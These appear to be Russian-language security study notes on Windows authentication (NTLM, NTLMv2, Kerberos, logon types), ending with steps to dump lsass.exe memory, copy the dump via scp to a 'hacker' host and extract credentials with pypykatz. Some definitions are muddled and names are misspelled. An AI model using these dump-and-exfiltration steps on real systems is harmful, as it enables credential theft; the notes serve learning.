`Authentication, authorization, and accounting`
**Identification** - предъявление логина, паспорта и проверка что такой пользователь может авторизоваться, получить доступ
**Authentication** - проверка подлинности по доп.признаку (паролю, PIN)
**Authorization** - проверка подлинности, тот кто есть действительно он
**Accounting** - журналирование событий

Локальная аутентификация
lsaas.exe переводит ввод пользователя в hash и сравнивает с локальной БД SAM (hash)
![[Pasted image 20231026203931.png]]
### NTLM и NetLogon
NTLM это алгоритм аутентификации по сети в AD. NetLogon это служба которая проводит процесс аутентификации на хосте
![[Pasted image 20231026204811.png]]
### NTLMv2
Добавилась метка времени в ответ с паролем 
![[Pasted image 20231026205002.png]]
### Kerberos
Протокол аутентификации который состоит из 3 этапов
1. Получение билета TGT у DC на сессию
2. Получение билета TGS у DC запрос на авторизацию в сервисе
3. Запрос у сервиса авторизацию с TGS. Сервис проверяет у DC может ли он пустить

![[Pasted image 20231026205748.png]]
## Типы авторизации
type2 - интерактивный. Физически через клавиатуру.
type3 - сетевой. Авторизация по сети, например на SMB папке
type4 - пакетный. Без участия пользователя, через задание
type5 - служба. Какая та служба от имени пользователя
type7 - разблокирование ПК. после блокировки сессии Win+L
type8 - clear_text. Когда авторизация происходит открытым паролем, например IIS
type9 - запущено от имени
type10 - авторизация через RDP, или виртуальный терминал
type11 - авторизация через кешерованную УЗ в реестре Computer\HKEY_LOCAL_MACHINE\SECURITY\Cache. Это происходит когда пользователь вышел из сети, авторизовался автономно и затем подключился к сети, для удаленщиков. Можно украсть через mimicatz
```
Открыть от админа диспетчер и найти процесс lsass.exe
lsass.exe <ПКМ> создать файл Дампа 
Открыть от админа cmd и отпавить файл
C:\Users\ADMpetr\AppData\Local\Temp>scp lsass.DMP hacker@192.168.10.10:/home/hacker
на Кали
pypykatz lsa minidump /home/hacker/lsass.DMP 
```